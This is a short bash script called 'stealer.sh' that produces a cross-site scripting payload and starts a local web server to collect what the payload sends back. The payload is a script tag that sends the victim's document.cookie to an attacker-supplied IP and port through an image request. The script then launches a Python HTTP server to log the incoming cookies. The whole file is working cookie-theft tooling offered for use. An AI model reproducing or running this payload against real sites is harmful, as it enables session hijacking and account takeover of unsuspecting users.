#!/bin/bash

function usage() {
    cat << EOF
Usage: $0 <IP> <PORT>

Options:
  -h, --help   Show this help message and exit

Description:
  This script creates a simple web server for capturing cookies.

Steps:
  1. Just provide your IP and port
  2. Run the script like: bash stealer.sh IP PORT
EOF
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    usage
    exit 0
fi

if [[ $# -ne 2 ]]; then
    echo "Error: Missing IP address or port."
    usage
    exit 1
fi

IP="$1"
PORT="$2"
PAYLOAD="0xmr<script>var i = new Image(); i.src=\"http://$IP:$PORT/?c=\" + document.cookie;</script>"
#echo " [+] Use this Payload ====> $PAYLOAD"
echo "        [  Payload 1  ] "
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo -e "\033[1;41;37m$PAYLOAD\033[0m"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "

echo " [+] Starting WEB SERVER on port $PORT..."
sudo python3 -m http.server $PORT
